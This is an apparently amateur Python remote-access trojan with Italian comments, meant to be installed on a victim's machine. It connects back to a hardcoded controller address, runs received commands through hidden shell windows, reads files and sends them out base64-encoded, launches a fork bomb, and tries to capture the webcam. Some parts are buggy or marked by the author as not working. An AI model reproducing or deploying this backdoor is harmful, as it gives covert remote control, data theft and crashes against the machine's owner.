#!/usr/bin/python
#questa e' la macchina che va installata sulla macchina target
import socket
import sys
import subprocess,time,os
import cv2
import base64


def show_webcam(mirror=False):
    cam = cv2.VideoCapture(0)
    while True:
        ret_val, img = cam.read()
        if mirror: 
            img = cv2.flip(img, 1)
        cv2.imshow('my webcam', img)
        if cv2.waitKey(1) == 27: 
            break  # esc to quit
    cv2.destroyAllWindows()

RHOST = "192.168.1.6" #ip della macchina target
RPORT = 443
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
sock.connect((RHOST, RPORT))
global count
count=0

while True:
    try:
        dati_ricevuti=sock.recv(2048)

        ###uscita
        if dati_ricevuti==b'exit':
            print("Terminating connections..\n")
            time.sleep(1)
            sock.close()
            break
    
        #elif dati_ricevuti.split(" ")[0] == "ls":
         #   avvio="ls"
         #   x=os.system(avvio)
          #  sock.send(x)

        ###command cd
        elif dati_ricevuti.split(" ")[0] == "cd":
            os.chdir(dati_ricevuti.split(" ")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode("utf-8"))
            count=count+1
            print("Messaggio di risposta numero " + " " + str(count) + " " + "inviato..\n")
        
        elif dati_ricevuti.split(" ")[0] == "mkdir":
            avvio="mkdir" + " " + dati_ricevuti.split(" ")[1]
            os.system(avvio)
            sock.send("Cartella creata")
            count=count+1
            print("Messaggio di risposta numero " + " " + str(count) + " " + "inviato..\n")

        ###download DA GUARDARE PERCHE' DURANTE IL TRASFERIMENTO DA VICTIM A ATTACKER VENGONO OTTENUTI SOLO ALCUNI DATI E NON TUTTI
        elif dati_ricevuti.split(" ")[0] == "download":
            with open(dati_ricevuti.split(" ")[1], "rb") as pdf_file:
                print(pdf_file)
                file_data = pdf_file.read(1000000)
                encoded_string = base64.b64encode(file_data)
                print(encoded_string)
                sock.send(encoded_string)
                print("Finished sending encoding string")
                count=count+1
                print("Messaggio di risposta numero " + " " + str(count) + " " + "inviato..\n")

        ###forkbomb
        elif dati_ricevuti=="forkbomb":
            while True:
                execution= subprocess.Popen(str("start"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = execution.communicate()
                count=count+1
                print("Messaggio di risposta numero " + " " + str(count) + " " + "inviato..\n")

        ###webcam ###non funziona
        elif dati_ricevuti=="webcam":
            sock.send(show_webcam(mirror=True))

        #altri comandi come ls
        else:
                SW_HIDE = 0
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW
                info.wShowWindow = SW_HIDE
                execution= subprocess.Popen(dati_ricevuti, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,startupinfo=info)
                valore= execution.stdout.read() + execution.stderr.read()
                print(valore)
                sock.send(valore)
                count=count+1
                print("Messaggio di risposta numero " + " " + str(count) + " " + "inviato..\n")

    except KeyboardInterrupt:
        sys.exit
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode('utf-8'))

sock.close()
